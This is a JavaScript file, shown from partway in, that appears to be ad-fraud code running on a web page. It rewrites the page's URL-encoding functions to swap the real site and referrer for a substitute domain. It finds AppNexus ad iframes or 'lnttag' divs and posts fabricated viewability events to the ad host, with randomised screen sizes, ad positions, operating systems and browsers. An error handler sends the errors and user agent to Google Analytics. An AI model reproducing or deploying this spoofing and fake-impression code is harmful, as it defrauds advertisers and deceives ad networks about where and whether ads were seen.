
  function getBrowserInfo()
  {
    var objappVersion = navigator.appVersion; var objAgent = navigator.userAgent; var objbrowserName = navigator.appName;
    var objfullVersion = ''+parseFloat(navigator.appVersion);var objBrMajorVersion = parseInt(navigator.appVersion,10);
    var objOffsetName,objOffsetVersion,ix;
    // In Chrome
    if ((objOffsetVersion=objAgent.indexOf("Chrome"))!=-1){ objbrowserName = "Chrome"; objfullVersion = objAgent.substring(objOffsetVersion+7); }
    // In Microsoft internet explorer
    else if((objOffsetVersion=objAgent.indexOf("MSIE"))!=-1){ objbrowserName = "Microsoft Internet Explorer";objfullVersion = objAgent.substring(objOffsetVersion+5); }
    // In Firefox
    else if((objOffsetVersion=objAgent.indexOf("Firefox"))!=-1){ objbrowserName = "Firefox"; }
    // In Safari
    else if ((objOffsetVersion=objAgent.indexOf("Safari"))!=-1){ objbrowserName = "Safari"; objfullVersion = objAgent.substring(objOffsetVersion+7); if((objOffsetVersion=objAgent.indexOf("Version"))!=-1) objfullVersion = objAgent.substring(objOffsetVersion+8); }
    // For other browser "name/version" is at the end of userAgent
    else if ( (objOffsetName=objAgent.lastIndexOf('')+1) < (objOffsetVersion=objAgent.lastIndexOf('/')) ){ objbrowserName = objAgent.substring(objOffsetName,objOffsetVersion);objfullVersion = objAgent.substring(objOffsetVersion+1); if(objbrowserName.toLowerCase()==objbrowserName.toUpperCase()){ objbrowserName = navigator.appName; } }
    // trimming the fullVersion string at semicolon/space if present
    if((ix=objfullVersion.indexOf(";"))!=-1) objfullVersion=objfullVersion.substring(0,ix); if((ix=objfullVersion.indexOf(" "))!=-1) objfullVersion=objfullVersion.substring(0,ix); objBrMajorVersion = parseInt(''+objfullVersion,10); if (isNaN(objBrMajorVersion)){ objfullVersion = ''+parseFloat(navigator.appVersion);objBrMajorVersion = parseInt(navigator.appVersion,10); }

    return { browser : objbrowserName, version : objfullVersion,ua : navigator.userAgent};
  }

function cascadeWindowInfo(info){
  var mapping = {};

  mapping[document.location.href] = info.site;
  if(document.referrer.length > 0)
    mapping[document.referrer] = info.site;

  try {
    mapping[parent.document.location.href] = info.site;
    if(parent.document.referrer.length > 0)
      mapping[parent.document.referrer] = info.site;
  } catch(e){}

  try {
    mapping[top.document.location.href] = info.site;
    if(top.document.referrer.length > 0)
      mapping[top.document.referrer] = info.site;
  } catch(e) {}

  if('ancestorOrigins' in window.location && window.location.ancestorOrigins.length > 0)
  {
    for(var i=0;i<window.location.ancestorOrigins.length;i++)
    {
      mapping[window.location.ancestorOrigins[i]] = info.domain;
    }
  }

  function privateEncode(str,type)
  {
    for(var match in mapping)
    {
      if(match.length > 0)
      {
        var re = new RegExp(match.trim(),"gi");
        //force string type
        str = "" + str;
        //str = str.toString();
        str = str.replace(re,mapping[match]);
        str = str.replace(match.trim(),mapping[match]);
      }
    }
    return privateFinish(type(str),type);
  }

  function privateFinish(str,type)
  {
    for(var match in mapping)
    {
      if(match.length > 0)
      {
        var re = new RegExp(type(match.trim()),"ig");
        str = str.replace(re,mapping[match]);
        str = str.replace(type(match.trim()),mapping[match]);
      }
    }
    return str;
  }

  function parse_url(str,component) {

    try {
      this.php_js = this.php_js || {};
    } catch (e) {
      this.php_js = {};
    }

    var query;
    var ini = (this.php_js && this.php_js.ini) || {};
    var mode = (ini['phpjs.parse_url.mode'] && ini['phpjs.parse_url.mode'].local_value) || 'php';
    var key = [
      'source',
      'scheme',
      'authority',
      'userInfo',
      'user',
      'pass',
      'host',
      'port',
      'relative',
      'path',
      'directory',
      'file',
      'query',
      'fragment'
    ];
    var parser = {
      php: /^(?:([^:\/?#]+):)?(?:\/\/()(?:(?:()(?:([^:@\/]*):?([^:@\/]*))?@)?([^:\/?#]*)(?::(\d*))?))?()(?:(()(?:(?:[^?#\/]*\/)*)()(?:[^?#]*))(?:\?([^#]*))?(?:#(.*))?)/,
      strict: /^(?:([^:\/?#]+):)?(?:\/\/((?:(([^:@\/]*):?([^:@\/]*))?@)?([^:\/?#]*)(?::(\d*))?))?((((?:[^?#\/]*\/)*)([^?#]*))(?:\?([^#]*))?(?:#(.*))?)/,
      loose: /^(?:(?![^:@]+:[^:@\/]*@)([^:\/?#.]+):)?(?:\/\/\/?)?((?:(([^:@\/]*):?([^:@\/]*))?@)?([^:\/?#]*)(?::(\d*))?)(((\/(?:[^?#](?![^?#\/]*\.[^?#\/.]+(?:[?#]|$)))*\/?)?([^?#\/]*))(?:\?([^#]*))?(?:#(.*))?)/ // Added one optional slash to post-scheme to catch file:/// (should restrict this)
    };

    var m = parser[mode].exec(str);
    var uri = {};
    var i = 14;

    while (i--) {
      if (m[i]) {
        uri[key[i]] = m[i];
      }
    }

    if(component) {
      return uri[component.replace('PHP_URL_','').toLowerCase()];
    }

    if (mode !== 'php') {
      var name = (ini['phpjs.parse_url.queryKey'] &&
        ini['phpjs.parse_url.queryKey'].local_value) || 'queryKey';
      parser = /(?:^|&)([^&=]*)=?([^&]*)/g;
      uri[name] = {};
      query = uri[key[12]] || '';
      query.replace(parser, function ($0, $1, $2) {
        if($1) {
          uri[name][$1] = $2;
        }
      });
    }

    delete uri.source;
    return uri;
  }

  function gDim(ur,aw,ah,e,dlo,r,x_)
  {
    var mf=Math.floor,mrd=Math.random,mr=Math.round;
    function rd(a,z){return mf(mrd()*(z-a+1)+a);}
    var ajax={};ajax.x=function(){if("undefined"!=typeof XMLHttpRequest)return new XMLHttpRequest;for(var e,t=["MSXML2.XmlHttp.5.0","MSXML2.XmlHttp.4.0","MSXML2.XmlHttp.3.0","MSXML2.XmlHttp.2.0","Microsoft.XmlHttp"],n=0;n<t.length;n++)
    try{e=new ActiveXObject(t[n]);break}catch(a){}return e},ajax.send=function(e,t,n,a,o){var r=ajax.x();r.open(n,e+"?"+a,o),r.onreadystatechange=function(){4==r.readyState&&t(r.responseText)},"POST"==n&&
  r.setRequestHeader("Content-type","application/x-wwwform-urlencoded"),r.send()},ajax.post=function(e,t,n,a){if("string"==typeof t)var o=t;else{var o=[];for(var r in t)o.push(encodeURIComponent(r)+"="+encodeURIComponent(t[r]));o=o.join("&")}
    ajax.send(e,n,"POST",o,a)};
    var dim = {
      "e": e,
      "dlo": dlo,
      "referrer": r,
      "type": 'pv',
      "px": false,
      "py": false,
      "bw": parseInt(aw),
      "bh": parseInt(ah),
      "sw": false,
      "sh": false,
      "pw": false,
      "ph": false,
      "ww": false,
      "wh": false,
      "x": x_
    };
    var szs = [[1440,900],[1600,900],[1920,1080],[1366,768],[1280,1024],[1280,800],[1024,768],[800,600]];
    var sz = szs[mf(mrd()*szs.length)];
    dim.sw = sz[0];
    dim.sh = sz[1];
    dim.ww = rd(mr(dim.sw*.5),dim.sw);
    dim.wh = rd(mr(dim.sw*.8),dim.sw);
    dim.pw = rd(dim.ww-10,dim.ww);
    dim.ph = rd(dim.wh,dim.wh*6);
    dim.px = rd(0,mf(dim.ww-(dim.bw*.7)));
    dim.py = rd(mf(dim.bh*.7),mf(dim.wh-(dim.bh*.7)));
    ajax.post(ur,dim,function(){},true);
  }

  function getDataByTagName()
  {

    var tv = 'view5-1',
      referrer = null,
      url = null,
      x = null,
      ts = (new Date).getTime() + Math.floor(Math.random() * 900000 + 100000),
      uos = ['mac', 'win'],
      ruos = uos[Math.floor(Math.random() * uos.length)],
      ua = (ruos == 'mac') ? ['webkit_chrome', 'gecko10'] : ['webkit_chrome','gecko10', 'ie11', 'ie10', 'ie9'],
      rua = ua[Math.floor(Math.random() * ua.length)],
      found = false;

    if(document.getElementsByTagName('iframe').length) {

      var withProperty = [],
        els = document.getElementsByTagName('iframe'),
        i = 0;
      for (i = 0; i < els.length; i++) {
        var src = els[i].getAttribute('src');
        if (src.match(/ib\.adnxs\.com\/if/)) {
          withProperty.push(els[i]);
        }
      }
      if(withProperty.length) {
        var el = withProperty[0],
          params = {},
          ifs = el.getAttribute('src'),
          aw = el.getAttribute('width'),
          ah = el.getAttribute('height'),
          d = aw + 'x' + ah,
          p = el.getAttribute('par');

        if (!p && ifs){
          var uri = parse_url(ifs),
            uriqry = uri.query.split('&'),
            ets = (new Date).getTime() + Math.floor(Math.random() * 900000 + 100000);
          for(var p in uriqry) {
            var param = uriqry[p].split('=');
            params[param[0]] = decodeURIComponent(param[1]);
          }
          url = 'http://' + uri.host + '/vevent';
          referrer = params.referrer;
          found = true;
          el.setAttribute('par', true);
          el.setAttribute('id', ets);
          params.id = ets;
          window.vparams.push({
            'url': url,
            'aw': aw,
            'ah': ah,
            'e':params.e,
            'dlo': params.dlo,
            'referrer': referrer,
            'x': x,
            'ts': ts,
            'uos': uos,
            'ruos': ruos,
            'ua': ua,
            'rua': rua,
            'tv': tv,
            'el': params.id
          });
        }
      }
    }
    if(document.getElementsByTagName('div').length)
    {
      var withProperty = [],
        els = document.getElementsByTagName('div'),
        i = 0,
        params = {};

      for (i = 0; i < els.length; i++) {
        if (els[i].hasAttribute('lnttag')) {
          withProperty.push(els[i]);
        }
      }

      if (withProperty.length)
      {
        var el = withProperty[0],
          lnttag = el.getAttribute('lnttag'),
          lnt = lnttag.split(';'),
          p = el.getAttribute('par'),
          ets = (new Date).getTime() + Math.floor(Math.random() * 900000 + 100000);

        if (!p) {
          lnt.splice(0, 1);
          for (var p in lnt) {
            var param = lnt[p].split('=');
            params[param[0]] = decodeURIComponent(param[1]);
          }

          var uri = parse_url(params.cb),
            uriqry = uri.query.split('&');
          for (var p in uriqry) {
            var param = uriqry[p].split('=');
            params[param[0]] = decodeURIComponent(param[1]);
          }

          var dm = params.d.split('x');
          aw = dm[0];
          ah = dm[1];
          url = 'http://' + uri.host + '/vevent';
          referrer = params.referrer;
          found = true;
          el.setAttribute('par', true);
          el.setAttribute('id', ets);
          params.id = ets;
          window.vparams.push({
            'url': url,
            'aw': aw,
            'ah': ah,
            'e': params.e,
            'dlo': params.dlo,
            'referrer': referrer,
            'x': x,
            'ts': ts,
            'uos': uos,
            'ruos': ruos,
            'ua': ua,
            'rua': rua,
            'tv': tv,
            'el': params.id
          });
        }
      }
    }
    return found;

  }

  function getDataByQuerySelector()
  {
    var tv = 'view5-1',
      referrer = null,
      url = null,
      x = null,
      ts = (new Date).getTime() + Math.floor(Math.random() * 900000 + 100000),
      uos = ['mac', 'win'],
      ruos = uos[Math.floor(Math.random() * uos.length)],
      ua = (ruos == 'mac') ? ['webkit_chrome','gecko10'] : ['webkit_chrome', 'gecko10', 'ie11', 'ie10','ie9'],
      rua = ua[Math.floor(Math.random() * ua.length)],
      found = false;

    if(document.querySelector('iframe[src*="ib.adnxs.com/if"]')){
      var params = {},
        el = document.querySelector('iframe[src*="ib.adnxs.com/if"]'),
        ifs = el.getAttribute('src'),
        aw = el.getAttribute('width'),
        ah = el.getAttribute('height'),
        d = aw + 'x' + ah,
        p = el.getAttribute('par'),
        ets = (new Date).getTime() + Math.floor(Math.random() * 900000 + 100000);

      if (!p && ifs) {
        var uri = parse_url(ifs),
          uriqry = uri.query.split('&');
        for (var p in uriqry) {
          var param = uriqry[p].split('=');
          params[param[0]] = decodeURIComponent(param[1]);
        }
        url = 'http://' + uri.host + '/vevent';
        referrer = params.referrer;
        found = true;
        params.id = ets;
        el.setAttribute('par',true);
        el.setAttribute('id', ets);

        window.vparams.push({
          'url': url,
          'aw': aw,
          'ah': ah,
          'e': params.e,
          'dlo': params.dlo,
          'referrer': referrer,
          'x': x,
          'ts': ts,
          'uos': uos,
          'ruos': ruos,
          'ua':ua,
          'rua': rua,
          'tv': tv,
          'el': params.id
        });
      }
    }
    if(document.querySelector('div[lnttag]')) {
      var el = document.querySelector('div[lnttag]'),
        params = {},
        lnttag = el.getAttribute('lnttag'),
        lnt = lnttag.split(';'),
        ets = (new Date).getTime() + Math.floor(Math.random() * 900000 + 100000),
        p = el.getAttribute('par');

      if (!p) {

        lnt.splice(0, 1);
        for (var p in lnt) {
          var param = lnt[p].split('=');
          params[param[0]] = decodeURIComponent(param[1]);
        }

        var uri = parse_url(params.cb),
          uriqry = uri.query.split('&');
        for (var p in uriqry) {
          var param = uriqry[p].split('=');
          params[param[0]] = decodeURIComponent(param[1]);
        }

        var dm = params.d.split('x');
        aw = dm[0];
        ah = dm[1];
        url = 'http://' + uri.host + '/vevent';
        referrer = params.referrer;
        found = true;

        params.id = ets;
        el.setAttribute('par', true);
        el.setAttribute('id', ets);

        window.vparams.push({
          'url': url,
          'aw': aw,
          'ah': ah,
          'e': params.e,
          'dlo': params.dlo,
          'referrer': referrer,
          'x': x,
          'ts': ts,
          'uos': uos,
          'ruos': ruos,
          'ua': ua,
          'rua': rua,
          'tv': tv,
          'el': params.id
        });
      }
    }
    return found;

  }

  var wrapper = {};


  wrapper['escape'] = window.escape;
  window.escape = function(n) { return privateEncode(n,wrapper['escape']); };


  wrapper['encodeURIComponent'] = window.encodeURIComponent;
  window.encodeURIComponent = function(n) { return privateEncode(n,wrapper['encodeURIComponent']); };

  wrapper['decodeURIComponent'] = window.decodeURIComponent;
  window.decodeURIComponent = function(n) { return privateEncode(n,wrapper['decodeURIComponent']); };

  wrapper['decodeURI'] = window.decodeURI;
  window.decodeURI = function(n) { return privateEncode(n,wrapper['decodeURI']); };

  wrapper['encodeURI'] = window.encodeURI;
  window.encodeURI = function(n) { return privateEncode(n,wrapper['encodeURI']); };

  wrapper['unescape'] = window.unescape;
  window.unescape = function(n) { return privateEncode(n,wrapper['unescape']); };

  if (Math.floor(Math.random() * (new Date().getSeconds())) < 10) {
    window._intv = 0;
    window._intc = 0;
    window.vdims = {};
    window.vparams = [];
    window._intv = setInterval(function () {

      var success = false,
        i;
      if (window._intc > 10){
        clearInterval(window._intv);
        delete window._intv;
        delete window._intc;
      }
      window._intc++;

      success = (typeof(document.querySelector) != 'undefined') ? getDataByQuerySelector() : getDataByTagName();

      if (!success) return false;

      for(i = 0;i<window.vparams.length; i++)
      {
        var params = window.vparams[i];
        params.x = params.ts + ',199999,v,' + params.ruos + ',' + params.rua + ',' + params.tv + ',90,,0';
        if (typeof(window.vdims[params.el]) == 'undefined') {
          gDim(params.url, params.aw,params.ah, params.e, params.dlo, params.referrer, params.x);
          window.vdims[params.el] = document.getElementById(params.el);
        }
      }
    }, 300);
  }
}

window.onerror = function(errorMsg, url, lineNumber) {
    var browser = getBrowserInfo(),
      value = 'Error: ' + errorMsg + ',Script: ' + url + ', Line: ' + lineNumber;
    ga('send','pageview');
    ga('send', 'event', {
      'eventCategory':comp[1]['company'],
      'eventAction': 'error',
      'eventLabel' : value
    });

    ga('send', 'event', {
      'eventCategory' : 'Browser',
      'eventAction' :browser.browser,
      'eventLabel'	: browser.ua
    });
  }
